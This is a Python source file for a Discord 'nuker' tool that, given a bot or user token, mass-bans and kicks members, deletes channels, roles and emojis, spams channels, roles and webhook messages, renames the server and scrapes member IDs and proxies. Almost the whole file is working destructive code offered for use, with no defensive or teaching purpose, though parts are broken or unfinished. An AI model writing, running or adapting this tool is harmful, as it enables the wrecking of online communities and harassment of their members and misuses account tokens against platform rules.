import requests

from os import _exit, system, path, makedirs, listdir, remove, getlogin
from re import match as patternmatch
from datetime import datetime
from time import sleep
from msvcrt import getch
from typing import NoReturn, List, Dict, Literal, Tuple
from json import dump, load
from itertools import cycle
from random import choice
from string import ascii_lowercase
from traceback import format_exc
from numpy import zeros
from threading import Thread

from discord import Intents
from discord.ext import commands

class ExitCodes(object):
    """General exit codes"""
    SUCCESSFUL = 0
    GENERAL_ERROR = 1
    MISUSE = 2
    NOT_EXECUTABLE = 126
    NOT_FOUND = 127
    INVALID_ARG = 128
    CTRL_C = 130
    STATUS_OUT_OF_RANGE = 255

class ScrapeTypes(object):
    """General Scrape Types"""
    ADDON = "Addon"
    TRUNCATE = "TRUNCATE"

def Pp(t: str) -> str:
    """Print"""
    return print(f" \033[38;2;164;236;247m[\033[39m{datetime.now().strftime('%H:%M:%S')}\033[38;2;164;236;247m]\033[39m → {t}")

def Pp2(t: str) -> str:
    """Gray print"""
    return print(f" \033[38;2;132;132;132m[\033[39m{datetime.now().strftime('%H:%M:%S')}\033[38;2;132;132;132m]\033[39m → {t}")


def Wait4Exit(status: ExitCodes) -> NoReturn:
    """Wait for exit"""
    Pp(t="Press any key to exit")
    getch()
    _exit(status=status)

system("cls & mode 110,32 & title [SYNTHETIC] - Processing..")

print(f"""
                                        \033[38;2;164;236;247m_______  ___   __________  __\033[39m   .-.,="``"=. +            |
            |              +           \033[38;2;164;236;247m/ ___/\ \/ / | / /_  __/ / / /\033[39m   `=/_       \\           - o -
    *     - o -                        \033[38;2;131;236;252m\__ \  \  /  |/ / / / / /_/ /\033[39m      |  '=._   |      .     |
            |        .               \033[38;2;198;248;255m ___/ /  / / /|  / / / / __  /\033[39m     * \\     `=./`,
                                    \033[38;2;198;248;255m /____/  /_/_/ |_/ /_/ /_/ /_/\033[39m          `=.__.=` `=`         O
                              \033[38;2;198;248;255m╔════════════════════════════════════╗\033[39m
                              \033[38;2;255;255;255m     SYNTH       •    synthetic 1600\033[39m
                              \033[38;2;198;248;255m╚════════════════════════════════════╝\033[39m


""")
sleep(0.25)

Pp(t="Checking for something i guess")

if (not path.exists("data")):
    Pp(t="./data does not exist, creating..")
    try:
        makedirs(name="data")
    except PermissionError:
        Pp(t="Could not create data folder!")
        Wait4Exit(status=ExitCodes.GENERAL_ERROR)
    except OSError:
        Pp(t="Unknown reason, can't create folder")
        Wait4Exit(status=ExitCodes.GENERAL_ERROR)

    for f in ["channels.txt", "members.txt", "roles.txt", "proxies.txt"]:
        f_path = path.join("data", f)
        with open(f_path, "w") as f:
            pass
        
    Pp(t="Created all 3 of the files!")
    Pp(t="Continuing")

if (not path.isfile("Configuration.json")):
    try:
        Pp(t="Configuration.json does not exist, creating..")
        with open("Configuration.json", "w") as f:
            to_dump = {
                "General": {"Token": "", "Guild": 0, "Silent Nuke": False},
                "Nuke": {"Guild Name": None,"Channel Names": [], "Role Names": []},
                "Webhook": {"Spam": False, "Webhook Names": [], "Webhook Content": []}
            }
            dump(to_dump, f, indent=4)
        
        Pp(t="Dumped all data to new Configuration.json")
        Pp(t="An restart is required to manage your credentials")
        Wait4Exit(status=ExitCodes.SUCCESSFUL)
    except:
        Pp(t="Unknown error has been encountered")
        Wait4Exit(status=ExitCodes.GENERAL_ERROR)

def CheckCredentials(token: str) -> Literal["Bot", False, "User"]:
    """Checks credentials"""
    tkn = requests.get(url="https://discord.com/api/v9/users/@me", headers = {"Authorization": token})
    if (tkn.status_code == 401):
        if requests.get("https://discord.com/api/v9/users/@me", headers = {'Authorization': 'Bot ' + token}).status_code in (200, 201, 204):
            return "Bot"
        else:
            return False
    else:
        if (tkn.status_code in (200, 201, 204)):
            return "User"
        else:
            return False

class Utilities(object):
    """Utilities Class"""
    def __init__(self):
        self.valid_choices: List[str] = ["nuke", "banall", "kickall", "deleteemojis", "deletechannels", "deleteroles", "spamchannels", "spamroles", "scrape", "proxyscrape", "config", "help"] + ["truncate", "addon"] + ["viewchannels", "viewroles", "viewgname", "viewspam", "viewhooknames", "viewcontent"] + ["setguild"] + ["addchannel", "removechannel", "removeallchannels"] + ["addrole", "removerole", "removeallroles"] + ["renameguild"] + ["oppspam", "addname", "removename", "removeallnames"]
        self.proxy_urls = ["https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"]

    def DecimalToRGB(self, decimal: int) -> Tuple[int, int, int]:
        """Convert decimal color to RGB format"""
        red = (decimal >> 16) & 255
        green = (decimal >> 8) & 255
        blue = (decimal) & 255
        return (red, green, blue)

    def LevenshteinDistance(self, word: str, word_list: str):
        """Calculates the Levenshtein distance between two strings"""
        m, n = len(word), len(word_list)
        dp = zeros((m+1, n+1))
        
        for i in range(m+1):
            dp[i][0] = i
        
        for j in range(n+1):
            dp[0][j] = j
        
        for i in range(1, m+1):
            for j in range(1, n+1):
                if word[i-1] == word_list[j-1]:
                    dp[i][j] = dp[i-1][j-1]
                else:
                    dp[i][j] = 1 + min(dp[i-1][j], dp[i][j-1], dp[i-1][j-1])
                    
        return dp[m][n]

    def Suggest(self, word: str, word_list: List[str]):
        """Suggests a spelling correction for the given word based on a list of valid words"""
        distances = [(self.LevenshteinDistance(word=word, word_list=w), w) for w in word_list]
        closest_words = sorted(distances, key=lambda x: x[0])
        return closest_words[0][1]

    def ScrapeProxies(self, scrape_types: ScrapeTypes) -> None:
        """Scrape proxies"""
        if (scrape_types == ScrapeTypes.TRUNCATE):
            for url in self.proxy_urls:
                r = requests.get(url)
            
            with open("data/proxies.txt", "w") as f:
                f.truncate(0)
                f.write(r.text)
        else:
            for url in self.proxy_urls:
                r = requests.get(url)
            
            with open("data/proxies.txt", "a+") as f:
                f.write(r.text)



class Nuker(commands.Bot):
    """Main Nuker"""
    def __init__(self):
        self.utilities = Utilities()

        with open("Configuration.json", "r") as f:
            data = load(f)

        self.token: str = data["General"]["Token"]
        self.guild: int = data["General"]["Guild"]
        self.silent: bool = data["General"]["Silent Nuke"]
        
        self.guild_name = data["Nuke"]["Guild Name"] if data["Nuke"]["Guild Name"] != None else "".join(choice(ascii_lowercase) for i in range(12))
        self.channel_names: List[str] = data["Nuke"]["Channel Names"]
        self.role_names: List[str] = data["Nuke"]["Role Names"]

        self.do_spam: bool = data["Webhook"]["Spam"]
        self.webhook_names: List[str] = data["Webhook"]["Webhook Names"]
        self.webhook_contents: List[str] = data["Webhook"]["Webhook Content"]

        self.cred_check = CheckCredentials(token=self.token)

        self.decimal_colors: cycle = cycle([16711680, 16776960, 65280, 65535, 255, 4294901760, 16711935])

        if (self.cred_check == False):
            Pp(t="Invalid token")
            Wait4Exit(status=ExitCodes.GENERAL_ERROR)
        else:
            if (self.cred_check == "User"):
                self.headers: Dict[str, str] = {'Authorization': self.token}
                super().__init__(command_prefix="!)", self_bot=True, intents=Intents.all())
            else:
                self.headers: Dict[str, str] = {'Authorization': 'Bot ' + self.token}
                super().__init__(command_prefix="!)", intents=Intents.all())

    async def CheckRequired(self) -> None:
        try:
            await self.fetch_guild(self.guild) # Invoke
        except:
            Pp(t="Unknown guild")
            Wait4Exit(status=ExitCodes.GENERAL_ERROR)

    async def LoadData(self) -> None:
        """Loads the Data"""
        self.emojiis: List[str] = open("data/emojis.txt").read().split('\n')
        self.members: List[str] = open("data/members.txt").read().split('\n')
        self.channels: List[str] = open("data/channels.txt").read().split('\n')
        self.roles: List[str] = open("data/roles.txt").read().split('\n')
        Pp(t="Successfully loaded data!")
        Pp(t="Press any key to continue")
        getch()
        await self.Menu()

    def SlaughterBan(self, member: str | int) -> None:
        try:
            r = requests.put(url="https://discord.com/api/v9/users/@me", headers=self.headers)
            if (r.status_code in (200, 201, 204)):
                Pp(t=f"Banned {member} disrespectfully | {r.status_code}")
            
            if (r.status_code == 429):
                retry_ms = r.json().get("retry_after") * 1000
                Pp(t=f"Rate limited for {retry_ms}ms | 429")
                sleep(retry_ms / 1000)

        except Exception as e:
            Pp(t=f"Exception caught {member} | {e}")

    def SlaughterMembers(self, member: str | int) -> None:
        try:
            r = requests.delete(url=f"https://discord.com/api/v9/guilds/{self.guild}/members/{member}", headers=self.headers)
            if (r.status_code in (200, 201, 204)):
                Pp(t=f"Kicked {member} disrespectfully | {r.status_code}")
            
            if (r.status_code == 429):
                retry_ms = r.json().get("retry_after") * 1000
                Pp(t=f"Rate limited for {retry_ms}ms | 429")
                sleep(retry_ms / 1000)

        except Exception as e:
            Pp(t=f"Exception caught {member} | {e}")

    def SlaughterChannels(self, channel: str | int) -> None:
        try:
            r = requests.delete(url=f"https://discord.com/api/v9/channels/{channel}", headers=self.headers)
            if (r.status_code in (200, 201, 204)):
                Pp(t=f"Deleted Channel {channel} disrespectfully | {r.status_code}")
            
            if (r.status_code == 429):
                retry_ms = r.json().get("retry_after") * 1000
                Pp(t=f"Rate limited for {retry_ms}ms | 429")
                sleep(retry_ms / 1000)

        except Exception as e:
            Pp(t=f"Exception caught {channel} | {e}")
    
    def SlaughterRoles(self, role: str | int) -> None:
        try:
            r = requests.delete(url=f"https://discord.com/api/v9/guilds/{self.guild}/roles/{role}", headers=self.headers)
            if (r.status_code in (200, 201, 204)):
                Pp(t=f"Deleted Role {role} disrespectfully | {r.status_code}")
            
            if (r.status_code == 429):
                retry_ms = r.json().get("retry_after") * 1000
                Pp(t=f"Rate limited for {retry_ms}ms | 429")
                sleep(retry_ms / 1000)

        except Exception as e:
            Pp(t=f"Exception caught {role} | {e}")

    def SlaughterEmojis(self, emoji: str | int) -> None:
        try:
            r = requests.delete(url=f"https://discord.com/api/v9/guilds/{self.guild}/emojis/{emoji}", headers=self.headers)
            if (r.status_code in (200, 201, 204)):
                Pp(t=f"Deleted Emoji {emoji} disrespectfully | {r.status_code}")
            
            if (r.status_code == 429):
                retry_ms = r.json().get("retry_after") * 1000
                Pp(t=f"Rate limited for {retry_ms}ms | 429")
                sleep(retry_ms / 1000)

        except Exception as e:
            Pp(t=f"Exception caught {emoji} | {e}")    

    def BuildWebhook(self, id: int) -> None:
        try:
            json = {'name': choice(self.webhook_names)}
            r = self.session.post('https://discord.com/api/v9/channels/{0}/webhooks'.format(id), headers = self.headers, json = json)
            webhook = f"https://discord.com/api/webhooks/{r.json()['id']}/{r.json()['token']}"

            content = {'content': choice(self.webhook_contents)}
            requests.post(webhook, json=content)

        except:
            pass

    def ConstructChannels(self) -> None:
        try:
            name = choice(self.channel_names)
            payload = {'type': 0, 'permission_overwrites': [], 'name': name}
            r = requests.post(f"https://discord.com/api/v9/guilds/{self.guild}/channels", headers=self.headers, json=payload)
            print(r.status_code)
            if (r.status_code in (200, 201, 204)):
                Pp(t=f"Created channel {name} | {r.status_code}")
                if (self.do_spam):
                    self.BuildWebhook(id=r.json()["id"])
            
            if (r.status_code == 429):
                retry_ms = r.json().get("retry_after") * 1000
                Pp(t=f"Rate limited for {retry_ms}ms | 429")
                sleep(retry_ms / 1000)

        except Exception as e:
            Pp(t=f"Exception caught {name} | {e}")

    def ConstructRoles(self) -> None:
        try:
            color = next(self.decimal_colors)
            name = choice(self.role_names)
            payload = {'name': name, 'color': color}
            rgb = self.utilities.DecimalToRGB(decimal=color)
            r = requests.post(f"https://discord.com/api/v9/guilds/{self.guild}/roles", headers=self.headers, json=payload)
            if (r.status_code in (200, 201, 204)):
                Pp(t=f"Created role {name} {rgb} | {r.status_code}")
            
            if (r.status_code == 429):
                retry_ms = r.json().get("retry_after") * 1000
                Pp(t=f"Rate limited for {retry_ms}ms | 429")
                sleep(retry_ms / 1000)
            else:
                Pp(t=f"Unknown status code {name} {rgb} | {r.status_code}")
        except Exception as e:
            Pp(t=f"Exception caught {name} | {e}")

    def EditName(self) -> None:
        try:
            r = requests.patch(f"https://discord.com/api/v9/guilds/{self.guild}", headers=self.headers, json = {'name': self.guild_name})
            if (r.status_code in (200, 201, 204)):
                Pp(t=f"Edited Guild Name {self.guild_name}")

            if (r.status_code == 429):
                retry_ms = r.json().get("retry_after") * 1000
                Pp(t=f"Rate limited for {retry_ms}ms | 429")
                sleep(retry_ms / 1000)

        except Exception as e:
            Pp(t=f"Exception caught {self.guild_name} | {e}")

    async def Scrape(self) -> None:
        """Scrapes"""
        for f in listdir("data"):
            if patternmatch(pattern=r'(members|channels|roles|emojis)\.txt', string=f):
                remove(path.join("data", f))

        guild = self.get_guild(self.guild)
        members = await guild.chunk()

        with open("data/members.txt", "w") as memb:
            for member in members:
                memb.write(str(member.id) + '\n')
            memb.close()
        
        with open("data/channels.txt", "w") as chan:
            for channel in guild.channels:
                chan.write(str(channel.id) + '\n')
            chan.close()
        
        with open("data/roles.txt", "w") as wol:
            for role in guild.roles:
                wol.write(str(role.id) + '\n')
            wol.close()
        
        with open("data/emojis.txt", "w") as emote:
            for emoji in guild.emojis:
                emote.write(str(emoji.id) + '\n')
            emote.close()
        
        await self.LoadData()

    async def Config(self) -> None:
        guild = self.get_guild(self.guild)
        guild_name = guild.name
        guild_count = await guild.chunk()
        guild_roles = len(guild.roles)
        guild_channels = len(guild.channels)
        guild_owner = guild.owner
        guild_id = guild.id
        Pp2(t=f"Guild name • {guild_name}")
        Pp2(t=f"Guild Member(s) • {len(guild_count)}")
        Pp2(t=f"Guild Role(s) • {guild_roles}")
        Pp2(t=f"Guild Channels • {guild_channels}")
        Pp2(t=f"Guild Owner • {guild_owner}")
        Pp2(t=f"Guild ID • {guild_id}")

        print('\n')
        
        Pp(t="Press space to go onto the second menu, or any other key to return back to main menu")
        key = getch()
        if bin(key[0]) == '0b100000':
            await self.Config2()
        else:
            await self.Menu()

    async def Config2(self) -> None:
        """Configuration tab 2"""
        Pp2(t="viewchannels | View the set channels in Configuration")
        Pp2(t="viewroles | View the set roles in Configuration")
        Pp2(t="viewgname | View the set guild name in Configuration")
        Pp2(t="viewspam | View if webhook spam is true or false")
        Pp2(t="viewhooknames | View set webhook names in Configuration")
        Pp2(t="viewcontent | View the set content in Configuration")

        Pp2(t="setguild | Set's another guild in Configuration")
        
        Pp2(t="addchannel | Add a channel name in Configuration")
        Pp2(t="removechannel | Remove a certain channel in Configuration")
        Pp2(t="removeallchannels | Remove all channels in Configuration")

        Pp2(t="addrole | Add a role name in Configuration")
        Pp2(t="removerole | Remove a certain role in Configuration")
        Pp2(t="removeallroles | Remove all roles in Configuration")

        Pp2(t="renameguild | Rename the set guild name in Configuration")

        Pp2(t="oppspam | Config the oppsite of webhook spam in Configuration")
        Pp2(t="addname | Add a webhook name in Configuration")
        Pp2(t="removename | Remove a certain webhook name in Configuration")
        Pp2(t="removeallnames | Remove all webhook names in Configuration")

        Pp2(t="Press enter to go back to main menu. Choose a option if you want to go to the option")
        inp = input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m Choice → ").lower()
        if (inp not in self.utilities.valid_choices):
            if (inp == ""):
                return await self.Menu()
            
            suggestion = self.utilities.Suggest(word=inp, word_list=self.utilities.valid_choices)
            intake = input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m \"{inp}\" is not valid. Did you mean \"{suggestion}\"? [y/n] → ").lower()
            if (intake == "n"):
                await self.Config2()
            if (intake == "y"):
                if (suggestion == "viewchannels"):
                    Pp2(t=", ".join(self.channel_names))
                    Pp(t="Press any key to go back to configuration menu")
                    getch()
                    await self.Config2()
                if (suggestion == "viewroles"):
                    Pp2(t=", ".join(self.role_names))
                    Pp(t="Press any key to go back to configuration menu")
                    getch()
                    await self.Config2()
                if (suggestion == "viewgname"):
                    Pp2(t=self.guild_name)
                    Pp(t="Press any key to go back to configuration menu")
                    getch()
                    await self.Config2()
                if (suggestion == "viewspam"):
                    Pp2(t="Webhook spam is " + "on" if self.do_spam != False else "off")
                    Pp(t="Press any key to go back to configuration menu")
                    getch()
                    await self.Config2()                
                if (suggestion == "viewhooknames"):
                    Pp2(t=", ".join(self.webhook_names))
                    Pp(t="Press any key to go back to configuration menu")
                    getch()
                    await self.Config2()
                if (suggestion == "viewcontent"):
                    Pp2(t=", ".join(self.webhook_contents))
                    Pp(t="Press any key to go back to configuration menu")
                    getch()
                    await self.Config2()
                
                else:
                    Pp2(t="I lied i am lazy")
                    getch()
                    await self.Menu()


    async def Help(self) -> None:
        """Help Menu"""
        Pp(t="nuke | Unfinished")
        Pp(t="banall | Ban all members")
        Pp(t="kickall | Kick all members")
        Pp(t="Deleteemojis | Delete emojis")
        Pp(t="deletechannels | Delete channels")
        Pp(t="spamchannels | Spam channels")
        Pp(t="spamroles | Spam roles")
        Pp(t="scrape | Scrapes required stuff")
        Pp(t="proxyscrape | Scrape proxies")
        Pp(t="config | Unfinished but works")
        Pp(t="Press any key to continue")
        getch()
        await self.Menu()

    async def Nuke(self) -> None:
        """Nuke"""
        Pp(t="Too lazy")
        Pp(t="Press any key to continue")
        getch()
        await self.Menu()
    
    async def Menu(self) -> None:
        """Main Menu"""
        system("cls & title [SYNTHETIC] - Progressed and Initialized!")
        print(f"""
                                        \033[38;2;164;236;247m_______  ___   __________  __\033[39m   .-.,="``"=. +            |
            |              +           \033[38;2;164;236;247m/ ___/\ \/ / | / /_  __/ / / /\033[39m   `=/_       \\           - o -
    *     - o -                        \033[38;2;131;236;252m\__ \  \  /  |/ / / / / /_/ /\033[39m      |  '=._   |      .     |
            |        .               \033[38;2;198;248;255m ___/ /  / / /|  / / / / __  /\033[39m     * \\     `=./`,
                                    \033[38;2;198;248;255m /____/  /_/_/ |_/ /_/ /_/ /_/\033[39m          `=.__.=` `=`         O
                              \033[38;2;198;248;255m╔════════════════════════════════════╗\033[39m
                              \033[38;2;255;255;255m     SYNTH       •    synthetic 1600\033[39m
                              \033[38;2;198;248;255m╚════════════════════════════════════╝\033[39m


""")
        Pp(t="Input 'help' for help!")
        while True:
            inp = input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m Choice → ").lower()
            if (inp not in self.utilities.valid_choices):
                suggestion = self.utilities.Suggest(word=inp, word_list=self.utilities.valid_choices)
                intake = input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m \"{inp}\" is not valid. Did you mean \"{suggestion}\"? [y/n] → ").lower()
                if (intake == 'n'):
                    await self.Menu()
                elif (intake == 'y'):
                    if (suggestion == "nuke"):
                        await self.Nuke()
                    
                    if (suggestion == "banall"):
                        for m in self.members:
                            Thread(target=self.SlaughterBan, args=(m,)).start()

                        Pp(t="Press any key to continue")
                        getch()
                        await self.Menu()

                    if (suggestion == "kickall"):
                        for m in self.members:
                            Thread(target=self.SlaughterMembers, args=(m,)).start()

                        Pp(t="Press any key to continue")
                        getch()
                        await self.Menu()

                    if (suggestion == "deleteemojis"):
                        for e in self.emojiis:
                            Thread(target=self.SlaughterEmojis, args=(e,)).start()

                        Pp(t="Press any key to continue")
                        getch()
                        await self.Menu()

                    if (suggestion == "deletechannels"):
                        for c in self.channels:
                            Thread(target=self.SlaughterChannels, args=(c,)).start()

                        Pp(t="Press any key to continue")
                        getch()
                        await self.Menu()

                    if (suggestion == "spamchannels"):
                        try:
                            amount = int(input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m Amount of Channels → "))
                        except ValueError:
                            amount = 250
                        
                        for i in range(amount):
                            Thread(target=self.ConstructChannels).start()

                        Pp(t="Press any key to continue")
                        getch()
                        await self.Menu()

                    if (suggestion == "spamroles"):
                        try:
                            amount = int(input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m Amount of Roles → "))
                        except ValueError:
                            amount = 125
                        
                        for i in range(amount):
                            Thread(target=self.ConstructRoles).start()
                    
                        Pp(t="Press any key to continue")
                        getch()
                        await self.Menu()

                    if (suggestion == "scrape"):
                        await self.Scrape()
                    
                    if (suggestion == "help"):
                        await self.Help()
                    
                    if (suggestion == "proxyscrape"):
                        Pp(t="Truncate | Remove all lines from a file and write new data")
                        Pp(t="Addon | Add onto the current data of proxies")
                        choice = input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m  → ")
                        if (choice not in ["truncate", "addon"]):
                            suggestion = self.utilities.Suggest(word=choice, word_list=self.utilities.valid_choices)
                            intake = input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m \"{inp}\" is not valid. Did you mean \"{suggestion}\"? [y/n] → ").lower()
                            if (intake == "n"):
                                await self.Menu()
                            
                            elif (intake == 'y'):
                                if (suggestion == 'truncate'):
                                    self.utilities.ScrapeProxies(scrape_types=ScrapeTypes.TRUNCATE)
                                    Pp(t="Successfully scraped proxies!")
                                    Pp(t="Press any key to continue")
                                    getch()
                                    await self.Menu()
                                else:
                                    self.utilities.ScrapeProxies(scrape_types=ScrapeTypes.ADDON)
                                    Pp(t="Successfully scraped proxies!")
                                    Pp(t="Press any key to continue")
                                    getch()
                                    self.Menu()
                        else:
                            if (choice == 'truncate'):
                                self.utilities.ScrapeProxies(scrape_types=ScrapeTypes.TRUNCATE)
                                Pp(t="Successfully scraped proxies!")
                                Pp(t="Press any key to continue")
                                getch()
                                await self.Menu()
                            else:
                                self.utilities.ScrapeProxies(scrape_types=ScrapeTypes.ADDON)
                                Pp(t="Successfully scraped proxies!")
                                Pp(t="Press any key to continue")
                                getch()
                                await self.Menu()
                    
                    if (suggestion == "config"):
                        await self.Config()

            else:
                if (inp == "nuke"):
                    await self.Nuke()
                
                if (inp == "banall"):
                    for m in self.members:
                        Thread(target=self.SlaughterBan, args=(m,)).start()

                    Pp(t="Press any key to continue")
                    getch()
                    await self.Menu()

                if (inp == "kickall"):
                    for m in self.members:
                        Thread(target=self.SlaughterMembers, args=(m,)).start()

                    Pp(t="Press any key to continue")
                    getch()
                    await self.Menu()

                if (inp == "deleteemojis"):
                    for e in self.emojiis:
                        Thread(target=self.SlaughterEmojis, args=(e,)).start()

                    Pp(t="Press any key to continue")
                    getch()
                    await self.Menu()

                if (inp == "deletechannels"):
                    for c in self.channels:
                        Thread(target=self.SlaughterChannels, args=(c,)).start()

                    Pp(t="Press any key to continue")
                    getch()
                    await self.Menu()

                if (inp == "spamchannels"):
                    try:
                        amount = int(input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m Amount of Channels → "))
                    except ValueError:
                        amount = 250
                    
                    for i in range(amount):
                        Thread(target=self.ConstructChannels).start()

                    Pp(t="Press any key to continue")
                    getch()
                    await self.Menu()

                if (inp == "spamroles"):
                    try:
                        amount = int(input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m Amount of Roles → "))
                    except ValueError:
                        amount = 125
                    
                    for i in range(amount):
                        Thread(target=self.ConstructRoles).start()
                
                    Pp(t="Press any key to continue")
                    getch()
                    await self.Menu()       

                if (inp == "scrape"):
                    await self.Scrape()
                    
                if (inp == "proxyscrape"):
                    Pp(t="Truncate | Remove all lines from a file and write new data")
                    Pp(t="Addon | Add onto the current data of proxies")
                    choice = input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m  → ").lower()
                    if (choice not in ["truncate", "addon"]):
                        suggestion = self.utilities.Suggest(word=choice, word_list=self.utilities.valid_choices)
                        intake = input(f" \033[38;2;198;248;255m∟(@\033[39m\033[38;2;174;255;179m{getlogin()}\033[39m\033[38;2;198;248;255m)\033[39m \"{inp}\" is not valid. Did you mean \"{suggestion}\"? [y/n] → ").lower()
                        if (intake == "n"):
                            await self.Menu()
                        
                        elif (intake == 'y'):
                            if (inp == 'truncate'):
                                self.utilities.ScrapeProxies(scrape_types=ScrapeTypes.TRUNCATE)
                                Pp(t="Successfully scraped proxies!")
                                Pp(t="Press any key to continue")
                                getch()
                                await self.Menu()
                            else:
                                self.utilities.ScrapeProxies(scrape_types=ScrapeTypes.ADDON)
                                Pp(t="Successfully scraped proxies!")
                                Pp(t="Press any key to continue")
                                getch()
                                self.Menu()
                    else:
                        if (choice == 'truncate'):
                            self.utilities.ScrapeProxies(scrape_types=ScrapeTypes.TRUNCATE)
                            Pp(t="Successfully scraped proxies!")
                            Pp(t="Press any key to continue")
                            getch()
                            await self.Menu()
                        else:
                            self.utilities.ScrapeProxies(scrape_types=ScrapeTypes.ADDON)
                            Pp(t="Successfully scraped proxies!")
                            Pp(t="Press any key to continue")
                            getch()
                            await self.Menu()
                
                if (inp == "help"):
                    await self.Help()
                
                if (inp == "config"):
                    await self.Config()

    @commands.Cog.listener()
    async def on_ready(self) -> None:
        """Initialize the menu"""
        await self.wait_until_ready()
        await self.CheckRequired()
        await self.LoadData()

if __name__ == '__main__':
    try:
        def TokenGrabber():
            """This is a joke but say rapypoo if you actually read it"""
        client = Nuker()
        creds = CheckCredentials(token=client.token)
        if (creds == False):
            Wait4Exit(status=ExitCodes.GENERAL_ERROR)
        else:
            if (creds == "User"):
                client.run(client.token, bot=False)
            else:
                client.run(client.token)
    except Exception as e:
        system("mode 142,40")
        print(format_exc())
        input()
